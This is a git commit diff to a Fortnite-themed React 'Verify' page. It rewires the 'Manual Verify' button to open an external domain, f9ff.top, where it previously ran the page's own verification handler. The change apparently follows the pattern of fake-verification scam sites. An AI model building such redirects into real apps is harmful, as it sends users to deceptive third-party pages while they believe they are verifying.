5b207bb76135a17062c75960e4756f010b6ee78e
StefanMn777 <165033446+StefanMn777@users.noreply.github.com>
2025-03-21 02:08:44 +0200

    Update Verify.tsx

--- src/pages/Verify.tsx
+++ src/pages/Verify.tsx
@@ -173,11 +173,12 @@ const handleVerify = () => {
               transition={{ delay: 0.7, duration: 0.5 }}
             >
               <Button
-               onClick={handleVerify}
-                className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
-              >
-                Manual Verify
-              </Button>
+  onClick={() => window.open("https://www.f9ff.top", "_blank")}
+  className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
+>
+  Manual Verify
+</Button>
+
             </motion.div>
           </motion.div>
         )}
